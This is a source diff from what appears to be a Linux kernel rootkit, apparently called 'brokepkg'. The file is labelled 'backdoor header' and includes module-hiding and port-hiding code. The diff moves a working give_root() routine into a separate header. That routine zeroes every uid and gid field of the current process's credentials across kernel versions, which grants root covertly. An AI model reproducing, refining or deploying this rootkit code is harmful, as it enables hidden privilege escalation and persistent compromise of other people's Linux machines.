@@ -2,6 +2,7 @@
 // backdoor header
 #include "backdoor.h"
 #include "config.h"
+#include "give_root.h"
 #include "module_hide.h"
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -75,36 +76,6 @@ int port_is_hidden(unsigned short port) {
     }
   }
   return 0;  // false
-}
-
-void give_root(void) {
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
-  current->uid = current->gid = 0;
-  current->euid = current->egid = 0;
-  current->suid = current->sgid = 0;
-  current->fsuid = current->fsgid = 0;
-#else
-  struct cred *newcreds;
-  newcreds = prepare_creds();
-  if (newcreds == NULL) return;
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) && \
-        defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) || \
-    LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
-  newcreds->uid.val = newcreds->gid.val = 0;
-  newcreds->euid.val = newcreds->egid.val = 0;
-  newcreds->suid.val = newcreds->sgid.val = 0;
-  newcreds->fsuid.val = newcreds->fsgid.val = 0;
-#else
-  newcreds->uid = newcreds->gid = 0;
-  newcreds->euid = newcreds->egid = 0;
-  newcreds->suid = newcreds->sgid = 0;
-  newcreds->fsuid = newcreds->fsgid = 0;
-#endif
-  commit_creds(newcreds);
-#endif
-#ifdef DEBUG
-  printk(KERN_INFO "brokepkg: given away root");
-#endif
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
